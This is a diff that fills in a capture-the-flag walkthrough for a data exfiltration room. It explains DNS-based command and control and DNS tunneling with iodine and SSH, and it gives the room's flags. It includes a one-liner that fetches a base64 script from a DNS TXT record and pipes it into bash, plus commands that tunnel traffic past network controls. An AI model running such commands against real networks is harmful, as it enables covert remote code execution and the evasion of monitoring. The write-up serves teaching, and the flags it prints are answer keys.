@@ -222,29 +222,124 @@ This guide contains the answer and steps necessary to get to them for the [Data 
 
    ><details><summary>Click for answer</summary>255</details>
 
-3. Execute the C2 communication over the DNS protocol of theflag.tunnel.com. What is the flag?
+3. Execute the C2 communication over the DNS protocol of the flag.tunnel.com. What is the flag?
 
+   We need to replicate the command we just did to retrieve the contents of the TXT file for the `flag.tunnel.com` server.
 
+   After uploading our script ins base64 format as a TXT entry, we retrieved the content of the TXT entry with:
 
-   ><details><summary>Click for answer</summary></details>
+   DNS EXFILTRATION TXT
+
+   ```console
+   dig +short -t TXT script.tunnel.com
+   ```
+
+   We named the TXT entry 'script' hence the subdomain.
+
+   We can do the same but for the `flag.tunnel.com` TXT entry.
+
+   ```console
+   dig +short -t TXT flag.tunnel.com
+   ```
+
+   DNS EXFILTRATION BASE64
+
+   We need to decode the string after removing the quotes.
+
+   ```console
+   dig +short -t TXT flag.tunnel.com | tr -d "\"" | base64 -d
+   ```
+
+   DNS EXFILTRATION CONTENTS
+
+   This gives us a script to get our flag. We can execute it with:
+
+   ```console
+   dig +short -t TXT flag.tunnel.com | tr -d "\"" | base64 -d | bash
+   ```
+
+   DNS EXFILTRATION FLAG
+
+   ><details><summary>Click for answer</summary>THM{C-tw0-C0mmun1c4t10ns-0v3r-DN5}</details>
 
 ### DNS Tunneling
 
 1. When the iodine connection establishes to Attacker, run theifconfigcommand. How many interfaces are? (including the loopback interface)
 
+   First we add the A and NS records to the DNS server to point to our attackbox.
 
+   DSN TUNNEL A
 
-   ><details><summary>Click for answer</summary></details>
+   DNS TUNNEL NS
+
+   Now that traffic pointed towards `t1.tunnel.com` will be directed to our machine, we can setup the iodine server on the attackbox.
+
+   ```console
+   sudo /sbin/iodined -f -c -P thmpass 10.1.1.1/24 t1.tunnel.com
+   ```
+
+   DNS TUNNEL SERVER
+
+   Then we setup the client side on the jump machine.
+
+   ```console
+   sudo iodine -f -P thmpass t1.tunnel.com
+   ```
+
+   DNS TUNNEL CLIENT
+
+   We can now check how many interfaces are active on the jump machine.
+
+   DNS TUNNEL INTERFACES
+
+   ><details><summary>Click for answer</summary>4</details>
 
 2. What is the network interface name created by iodined?
 
+   There is one interface that was added after establishing the connection and it is the top one in the previous image.
 
+   ><details><summary>Click for answer</summary>dns0</details>
 
-   ><details><summary>Click for answer</summary></details>
+3. Use the DNS tunneling to prove your access to the webserver, http://192.168.0.100/test.php. What is the flag?
 
-3. Use the DNS tunneling to prove your access to the webserver,http://192.168.0.100/test.php. What is the flag?
+   Now that the DNS tunnel is in place we can connect to the jump box through the DNS tunnel via ssh.
 
+   ```console
+   ssh thm@10.1.1.2 -4 -N -f -D 1080
+   ```
 
+   This creates an ssh session with -D to enable the dynamic port forwarding feature to use the SSH session as a proxy using only IPv4 (-4).
 
-   ><details><summary>Click for answer</summary></details>
+   DNS TUNNEL SSH
+
+   At first I thought something didn't work but later found out the the ssh session was backgrounded with the `-f` argument.
+
+   Now we can use two methods to connect to the local machine. Curl or Proxychains. 
+
+   Using curl can be done with the following command:
+
+   ```console
+   curl --socks5 127.0.0.1:1080 http://192.168.0.100/test.php
+   ```
+
+   DNS TUNNEL CURL FLAG
+
+   For Proxychains we must first add the proxy to the config file.
+
+   ```console
+   nano /etc/proxychains4.conf
+
+   # Add at the end
+   socks5 127.0.0.1 1080
+   ```
+
+   Now we can also use Proxychains with:
+
+   ```console
+   proxychains curl http://192.168.0.100/test.php
+   ```
+
+   DNS TUNNEL PROXYCHAINS FLAG
+
+   ><details><summary>Click for answer</summary>THM{DN5-Tunn311n9-1s-c00l}</details>
 
